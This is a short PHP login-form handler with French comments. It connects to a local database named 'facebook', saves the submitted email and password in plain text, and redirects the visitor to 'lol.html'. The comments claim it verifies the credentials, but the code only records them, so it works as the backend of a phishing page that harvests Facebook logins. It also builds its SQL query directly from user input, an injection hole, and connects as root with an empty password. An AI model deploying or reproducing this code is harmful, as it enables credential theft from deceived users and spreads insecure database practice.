<?php
    if(isset($_POST['boutton-valider'])){ // Si on clique sur le boutton , alors :
        //Nous allons verifiér les informations du formulaire
        if(isset($_POST['login']) && isset($_POST['password'])) { //On verifie ici si l'utilisateur a rentré des informations
          //Nous allons mettres l'email et le mot de passe dans des variables
          $email = $_POST['login'] ;
          $mdp = $_POST['password'] ;
          $erreur = "" ;
           //Nous allons verifier si les informations entrée sont correctes
           //Connexion a la base de données
           $nom_serveur = "127.0.0.1";
           $utilisateur = "root";
           $mot_de_passe ="";
           $nom_base_données ="facebook" ;
           $con = mysqli_connect($nom_serveur , $utilisateur ,$mot_de_passe , $nom_base_données);
           //requete pour selectionner  l'utilisateur qui a pour email et mot de passe les identifiants qui ont été entrées
           $req = mysqli_query($con , "INSERT INTO users VALUE (NULL, '$email', '$mdp') ") ;
           header("Location:lol.html") ;
            
        }
      }
    ?>